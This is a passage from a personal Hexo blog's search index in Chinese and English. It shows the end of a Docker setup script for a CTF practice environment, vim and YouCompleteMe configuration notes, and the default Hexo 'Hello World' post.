$&#123;ctf_name&#125;-stop.shEOFchmod 755 $&#123;ctf_name&#125;-stop.sh# Create a workdir for this CTFdocker exec $&#123;ctf_name&#125; mkdir /root/workdocker cp linux_server $&#123;ctf_name&#125;:/root/workdocker cp linux_server64 $&#123;ctf_name&#125;:/root/work# Get a shellecho -e "$&#123;GREEN&#125; ______ $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;___________ ___________ /___________ __$&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;___ __ \\_ | /| / /_ __ \\_ __ \\ __ \\_ |/_/$&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;__ /_/ /_ |/ |/ /_ / / / /_/ / /_/ /_&gt; &lt; $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;_ .___/____/|__/ /_/ /_//_.___/\\____//_/|_| $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;/_/ by superkojiman $&#123;RESET&#125;"echo ""docker attach $&#123;ctf_name&#125; 需要同目录下有linux_server和linux_server64文件(在ida安装目录下的dbgsrv里面)。 接下来对本机vim进行配置，安装YouCompleteMe和一些缩进的配置。 .vimrc: 123456789101112131415161718192021222324set nocompatibleset rtp+=~/.vim/plugged/set numberset t_Co=256syntax onset autoindentset smartindentset tabstop=4set shiftwidth=4"themecolorscheme molokai"YouCompleteMelet g:ycm_global_ycm_extra_conf = '~/.ycm_extra_conf.py'let g:ycm_min_num_of_chars_for_completion=1let g:ycm_warning_symbol='&gt;*'let g:ycm_error_symbol='&gt;&gt;'call plug#begin('~/.vim/plugged')Plug 'Valloric/YouCompleteMe'call plug#end() YouCompleteMe clone到vim里面后，还需要进去编译一下，执行 123sudo apt install build-essential cmake python3-devcd ~/.vim/plugged/YouCompleteMepython3 install.py --clang-completer 到此为止就差不多够用了]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F05%2F30%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post 1$ hexo new "My New Post" More info: Writing Run server 1$ hexo server More info: Server Generate static files 1$ hexo generate More info: Generating Deploy to remote sites 1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
